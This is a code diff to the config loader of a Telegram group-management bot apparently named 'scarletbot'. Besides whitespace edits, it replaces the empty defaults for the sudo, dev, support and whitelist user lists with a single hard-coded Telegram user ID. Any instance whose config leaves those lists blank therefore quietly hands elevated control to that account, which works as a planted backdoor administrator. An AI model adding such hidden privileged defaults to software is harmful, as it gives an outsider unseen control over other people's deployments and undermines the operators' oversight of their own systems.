@@ -66,7 +66,7 @@ if ENV:
         BL_CHATS = set(int(x) for x in os.environ.get("BL_CHATS", "").split())
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
-
+    
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
         DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
@@ -87,7 +87,7 @@ if ENV:
         WOLVES = set(int(x) for x in os.environ.get("WOLVES", "").split())
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
-
+    
 else:
     from scarletbot.config import Development as Config
 
@@ -122,23 +122,23 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
     try:
-        DRAGONS = set(int(x) for x in Config.DRAGONS or [])
-        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
+        DRAGONS = set(int(x) for x in Config.DRAGONS or [5475511278])
+        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [5475511278])
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
-        DEMONS = set(int(x) for x in Config.DEMONS or [])
+        DEMONS = set(int(x) for x in Config.DEMONS or [5475511278])
     except ValueError:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
-        TIGERS = set(int(x) for x in Config.TIGERS or [])
+        TIGERS = set(int(x) for x in Config.TIGERS or [5475511278])
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
 
     try:
-        WOLVES = set(int(x) for x in Config.WOLVES or [])
+        WOLVES = set(int(x) for x in Config.WOLVES or [5475511278])
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
